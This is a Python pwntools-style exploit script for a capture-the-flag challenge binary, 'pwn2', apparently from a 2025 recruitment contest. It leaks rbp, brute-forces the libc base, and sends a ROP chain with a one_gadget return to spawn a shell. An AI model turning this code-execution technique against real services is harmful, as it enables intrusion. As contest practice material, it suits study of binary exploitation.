from kk import *
context(arch='amd64', os='linux')
#p = remote('192.168.127.12', 10001)
p = process(['./pwn2'])
elf = ELF('./pwn2')
libc = ELF('/home/kk/ti/靶场/2025招新赛/check_rbp/libc.so.6')

func = 0x4011e0

#GDB(p)
p.recvuntil(b'Please')
line = p.recvline()
m = re.search(b'0x[0-9a-fA-F]+', line)
rbp = int(m.group(), 16)
print(f"[+] rbp = {hex(rbp)}")

# 计算爆破范围
rbp_high = (rbp >> 32) & 0xFFFFF  # 提取高20位
print(f"[+] rbp_high = {hex(rbp_high)}")

# one_gadget 偏移
one_gadget_offset = 0xebc81

p.recvuntil(b"I think you can overcome it!")

# 直接使用已知的偏移量（不需要 libcrop！）
pop_rdi_offset = 0x2a3e5
bin_sh_offset = 0x1d8678  # /bin/sh 在 libc 中的偏移
system_offset = 0x50d70   # system 在 libc 中的偏移

print(f"[+] pop_rdi offset = {hex(pop_rdi_offset)}")
print(f"[+] bin_sh offset = {hex(bin_sh_offset)}")
print(f"[+] system offset = {hex(system_offset)}")

# 爆破 libc 基址
for i in range(0x100):
    libc_base = (rbp_high << 32) | (i << 16)


    # 使用偏移 + 基址计算实际地址
    pop_rdi = libc_base + pop_rdi_offset
    bin_sh = libc_base + bin_sh_offset
    system = libc_base + system_offset
    one_gadget = libc_base + one_gadget_offset
    
    payload = (p64(pop_rdi) + p64(bin_sh) + p64(system)).ljust(0x40, b'\x00')  # 填充缓冲区
    payload += p64(rbp)  # 保存的 rbp（绕过检查）
    payload += p64(one_gadget)  # 返回地址 -> one_gadget

    p.send(payload)

    try:
        result = p.recv(timeout=1)
        if b'$' in result or b'#' in result or b'shell' in result.lower():
            print(f"[+] Success! libc_base = {hex(libc_base)}")
            p.interactive()
            break
        else:
            # 没有成功，重新连接
            p.close()
            #p = remote('192.168.127.12', 10001)
            p = process('./pwn2')
            p.recvuntil(b'Please')
            line = p.recvline()
            m = re.search(b'0x[0-9a-fA-F]+', line)
            rbp = int(m.group(), 16)
            p.recvuntil(b"I think you can overcome it!")
    except:
        p.close()
        #p = remote('192.168.127.12', 10001)
        p = process('./pwn2')
        p.recvuntil(b'Please')
        line = p.recvline()
        m = re.search(b'0x[0-9a-fA-F]+', line)
        rbp = int(m.group(), 16)
        p.recvuntil(b"I think you can overcome it!")

p.interactive()
